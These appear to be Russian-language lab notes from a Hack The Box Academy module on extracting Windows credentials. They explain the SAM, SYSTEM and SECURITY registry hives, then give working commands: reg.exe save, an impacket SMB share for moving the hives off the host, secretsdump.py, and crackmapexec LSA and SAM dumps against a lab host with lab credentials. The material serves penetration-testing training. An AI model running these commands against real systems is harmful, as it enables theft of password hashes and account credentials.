`hklm\sam`

Содержит хэши, связанные с паролями локальных учетных записей. Нам понадобятся хэши, чтобы мы могли взломать их и получить пароли учетных записей пользователей в открытом виде.

`hklm\system`

Содержит загрузочный ключ системы, который используется для шифрования базы данных SAM. Нам понадобится бутключ для расшифровки базы данных SAM.

`hklm\security`

Содержит кэшированные учетные данные для учетных записей домена. Нам может быть полезно иметь это на присоединенной к домену цели Windows.

#### Использование сохранения reg.exe для копирования кустов реестра
```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
```

#### Создание общего ресурса с помощью smbserver.py
```shell-session
lizergindoma@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

#### Запуск secretsdump.py
```shell-session
lizergindoma@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

#### Удаленный сброс секретов LSA
```shell-session
lizergindoma@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Удаленный сброс SAM
```shell-session
lizergindoma@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
